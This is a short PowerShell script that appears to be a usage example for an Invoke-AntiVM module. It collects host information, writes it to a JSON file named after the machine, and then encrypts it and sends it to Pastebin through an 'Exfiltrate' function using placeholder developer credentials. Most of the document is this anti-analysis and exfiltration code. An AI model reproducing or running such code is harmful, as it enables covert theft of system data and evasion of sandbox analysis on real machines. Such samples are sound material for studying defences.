Import-Module .\Invoke-AntiVM.psd1

$json = Get-Info -Token "VmwareTest"

$json > "$((Get-Location).Path)\$($env:COMPUTERNAME).json"

$dev_key  = 'YOURDEVKEY'
$password = 'YOURPASS'
$username  = 'YOURUSERNAME'

$Key = Get-Content '.\random.key'

$compressed,$ok = Exfiltrate -ID "VmwareTest" -Data $json -Key $Key -ExfilOption 'pastebin' -dev_key $dev_key -username $user -password $password
Write-Host $ok
$compressed > "$((Get-Location).Path)\pastebin\data\local_compresed.json"